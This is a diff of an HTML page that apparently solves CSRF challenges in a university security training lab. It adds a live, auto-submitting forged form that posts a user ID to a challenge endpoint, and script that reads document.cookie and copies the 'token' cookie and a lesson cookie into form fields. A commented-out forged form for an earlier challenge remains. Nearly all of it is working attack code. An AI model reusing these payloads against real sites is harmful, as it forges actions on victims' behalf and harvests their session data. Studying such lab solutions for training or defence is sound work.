@@ -1,45 +1,42 @@
+
+<form id="antmoForm3" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus" method="POST">
+    <input id="userid" type="hidden" value="01bccd80310843d96f854b4a43ab6725a41823bf" name="userid"/>
+    <input id="csrfToken" type="hidden" value="0" name="csrfToken"/>
+    <input type="submit"/>
+</form>
+
 <script>
-    alert("!!!")
+    document.getElementById("antmoForm3").submit();
+    function getCookie(cname) {
+        var name = cname + "=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        console.log(decodedCookie)
+        var ca = decodedCookie.split(';');
+        for(var i = 0; i <ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return cname + " not found";
+    }
+    document.getElementById("tokenid").value = getCookie("token")
+    document.getElementById("msgid").value = getCookie("securityMisconfigLesson")
+    document.getElementById("antmoForm3").submit();
 </script>
 
-<!--<form id="antmoForm3" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus" method="POST">-->
-    <!--<input id="userid" type="hidden" value="01bccd80310843d96f854b4a43ab6725a41823bf"/>-->
-    <!--<input id="csrfToken" type="hidden" value="0"/>-->
-    <!--<input type="submit"/>-->
-<!--</form>-->
 
-<!--<script>-->
-    <!--document.getElementById("antmoForm3").submit();-->
-    <!--function getCookie(cname) {-->
-        <!--var name = cname + "=";-->
-        <!--var decodedCookie = decodeURIComponent(document.cookie);-->
-        <!--console.log(decodedCookie)-->
-        <!--var ca = decodedCookie.split(';');-->
-        <!--for(var i = 0; i <ca.length; i++) {-->
-            <!--var c = ca[i];-->
-            <!--while (c.charAt(0) == ' ') {-->
-                <!--c = c.substring(1);-->
-            <!--}-->
-            <!--if (c.indexOf(name) == 0) {-->
-                <!--return c.substring(name.length, c.length);-->
-            <!--}-->
-        <!--}-->
-        <!--return cname + " not found";-->
-    <!--}-->
-    <!--document.getElementById("tokenid").value = getCookie("token")-->
-    <!--document.getElementById("msgid").value = getCookie("securityMisconfigLesson")-->
-    <!--document.getElementById("antmoForm3").submit();-->
-<!--</script>-->
+<!--
+<form id="antmoForm1" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
+    <input type="submit"/>
+</form>
 
+<script>
+    document.getElementById("antmoForm1").submit();
+</script>
 
-<!--&lt;!&ndash;-->
-<!--<form id="antmoForm1" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">-->
-    <!--<input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />-->
-    <!--<input type="submit"/>-->
-<!--</form>-->
-
-<!--<script>-->
-    <!--document.getElementById("antmoForm1").submit();-->
-<!--</script>-->
-
-<!--&ndash;&gt;-->
+-->
